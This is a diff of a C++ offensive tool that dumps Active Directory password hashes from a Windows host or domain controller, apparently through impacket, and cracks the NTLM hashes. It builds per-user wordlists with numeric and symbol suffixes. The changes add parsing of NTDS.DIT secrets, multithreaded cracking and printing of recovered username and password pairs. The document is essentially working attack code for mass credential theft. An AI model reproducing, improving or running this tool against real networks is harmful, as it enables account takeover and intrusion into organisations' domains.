@@ -9,6 +9,7 @@
 #include <cstring>
 #include <cstring>
 #include <CLI/CLI.hpp>
+#include <thread>
 using namespace std;
 
 class Cracker {
@@ -30,14 +31,19 @@ class Cracker {
             return usernames;
         }
 
-        std::pair<bool, string> crack(std::vector<string> wordlist, const char* hash){
+        void crack(std::vector<string> wordlist, const char* hash, const char* username){
             for (auto i = 0; i < wordlist.size(); i++) {
                 const char* generated_hash = gen_ntlm(wordlist[i]);
                 if (std::strcmp(hash, generated_hash) == 0) {
-                    return std::make_pair(true, wordlist[i]);
+                    std::cout << "\033[32m" << "[+] " << "\033[1;32m" << "Cracked: " <<
+                    "\033[0m" <<
+                    "\033[32m" <<
+                    "['" << username << "':" <<
+                    "'" << wordlist[i] << "']" <<
+                    "\033[0m" <<
+                    std::endl;
                 }
             }
-            return std::make_pair(false, "");
         }
         
         string get_ntds() {
@@ -59,6 +65,7 @@ class Cracker {
         std::unordered_map<std::string, std::string>  parse_hashes(const std::string& input) {        
             std::unordered_map<std::string, std::string> result;
             std::regex re("nthash\\)(.*?)\\[\\*\\]");
+            std::regex re_for_dc("NTDS\\.DIT secrets(.*?)\\[\\*\\]");
             std::string modified_input = input; // Create a non-const copy of the input string
             std::string helper_for_regex = "\n";
             std::smatch match;
@@ -71,14 +78,19 @@ class Cracker {
             std::istringstream iss("");
             std::istringstream iss_line("");
             std::unordered_map<std::string, std::string> creds;
-
+        
             while ((pos = modified_input.find(helper_for_regex, pos)) != std::string::npos) {
                 modified_input.replace(pos, helper_for_regex.length(), "^");
                 pos += 6; // Move past the replaced string
             }
             
-            if (std::regex_search(modified_input, match, re)) {
+            if (std::regex_search(modified_input, match, re_for_dc)) {
                 matched_str = match[1].str();
+            } else {
+                match = std::smatch();
+                if (std::regex_search(modified_input, match, re)) {        
+                    matched_str = match[1].str();
+                }
             };
 
             iss.str(matched_str);
@@ -103,28 +115,41 @@ class Cracker {
         }
 
         void launch() {
-            std::cout << "[*] Dumping hashes..." << std::endl;
+            std::pair<bool, string> crack_status;
+            std::vector<std::thread> threads;
+            std::vector<std::pair<bool, std::string>> results;
+
+            std::cout << "\033[33m" << "[*] Dumping hashes..." << 
+                "\033[0m" <<
+                std::endl;
             std::string output = get_ntds();
+            
             if (output.length() > 0) {
-                std::cout << "[+] Hashes dumped!" << std::endl;
+                std::cout << "\033[32m" << "[+] Hashes dumped!" << 
+                    "\033[0m" <<
+                    std::endl;
             } else {
                 return;
             }
-            std::cout << "[*] Parsing dumped hashes..." << std::endl;
+            std::cout << "\033[33m" << "[*] Parsing dumped hashes..." << 
+                "\033[0m" <<
+                std::endl;
             std::unordered_map<std::string, std::string> creds = parse_hashes(output);
-            std::vector<string> resp;
-            std::pair<bool, string> crack_status;
+
             for (const auto& kv : creds) {
-                std::cout << "[*] The password of '" << 
-                kv.first << "' is cracking..." << std::endl;
-                crack_status = std::make_pair(false, "");
+                std::cout << "\033[33m" << "[*] The password of '" << 
+                    kv.first << "' is cracking..." 
+                    "\033[0m" <<
+                    std::endl;
                 std::vector<string> wl = generate(kv.first);
-                crack_status = crack(wl, kv.second.c_str());
-                if (crack_status.first) {
-                    std::cout << "[+] Cracked: " <<
-                        "['" << kv.first << "':" <<
-                        "'" << crack_status.second << "']" <<
-                        std::endl;
+                threads.emplace_back(
+                    &Cracker::crack, this, wl, kv.second.c_str(), kv.first.c_str()
+                );
+                if (threads.size() == 10) {
+                    for (auto& thread : threads) {
+                        thread.join();
+                    }
+                    threads.clear();
                 }
             }
         }
@@ -152,25 +177,26 @@ class Cracker {
             "009"
     };
 
-    std::vector<std::string> extender(std::vector<std::string> initial_extensions){
-        std::vector<std::string> extensions;
-        for (int i = 1; i < 99999; i++) {
-            std::string str_i = std::to_string(i);
-            extensions.push_back(str_i);
-            extensions.push_back(str_i + "!");
-            extensions.push_back(str_i + "!!");
-            extensions.push_back(str_i + "!!!");
-            extensions.push_back(str_i + "@");
-            extensions.push_back(str_i + "!@#");
-            extensions.push_back(str_i + "!@");
-            extensions.push_back(str_i + "!@#$%");
-            extensions.push_back(str_i + "!@#$%^");
+        std::vector<std::string> extender(std::vector<std::string> initial_extensions){
+            std::vector<std::string> extensions;
+            for (int i = 1; i < 99999; i++) {
+                std::string str_i = std::to_string(i);
+                extensions.push_back(str_i);
+                extensions.push_back(str_i + "!");
+                extensions.push_back(str_i + "!!");
+                extensions.push_back(str_i + "!!!");
+                extensions.push_back(str_i + "@");
+                extensions.push_back(str_i + "!@#");
+                extensions.push_back(str_i + "!@");
+                extensions.push_back(str_i + "!@#$%");
+                extensions.push_back(str_i + "!@#$%^");
+            }
+            initial_extensions.insert(initial_extensions.end(), 
+                                        extensions.begin(), 
+                                        extensions.end());
+            return initial_extensions;
         }
-        initial_extensions.insert(initial_extensions.end(), 
-                                    extensions.begin(), 
-                                    extensions.end());
-        return initial_extensions;
-    }
+    
 };
 
 int main(int argc, char** argv) {
@@ -180,7 +206,7 @@ int main(int argc, char** argv) {
                      "  /  |/ / / / / __ \\/ / / / ___/ __/ _ \\/ ___/\n"
                      " / /|  / / / / /_/ / /_/ (__  ) /_/  __/ /    \n"
                      "/_/ |_/ /_/ /_.___/\\__,_/____/\\__/\\___/_/     \n";
-    cout << banner_text << endl;
+    cout << "\033[31m" << banner_text << "\033[0m" << endl;
 
     std::string python_check_command = "/usr/bin/python3 --version > /dev/null 2>&1";
     std::string impacket_check_command = "/usr/bin/python3 -c \"import impacket\" > /dev/null 2>&1";
@@ -209,9 +235,9 @@ int main(int argc, char** argv) {
     std::string target = username + ":" + password + "@" + ip_address;
 
     // Use the target value
-    Cracker C;
-    C.target = target;
-    C.launch();
+    Cracker cracker;
+    cracker.target = target;
+    cracker.launch();
 
     return 0;
 }
